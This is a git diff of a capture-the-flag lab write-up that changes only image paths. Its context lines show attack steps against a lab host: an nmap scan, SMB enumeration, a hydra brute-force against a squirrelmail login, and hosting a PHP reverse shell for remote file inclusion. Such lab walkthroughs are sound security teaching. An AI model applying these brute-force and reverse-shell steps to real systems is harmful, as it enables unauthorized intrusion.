@@ -6,7 +6,7 @@
 nmap -A 10.10.13.172
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 ```
 smbclient -L //10.10.13.172
@@ -47,7 +47,7 @@ hydra -l milesdyson -P passwords.txt 10.10.13.172 http-post-form "/squirrelmail/
 
 We can now login to squirrelmail that gobuster discovered.
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -93,7 +93,7 @@ Now we will try RFI to get a reverse shell
 
 Create PHP reverse shell then host the file
 
-<figure><img src="../../.gitbook/assets/image (3) (3) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 ```
 python2 -m SimpleHTTPServer 81
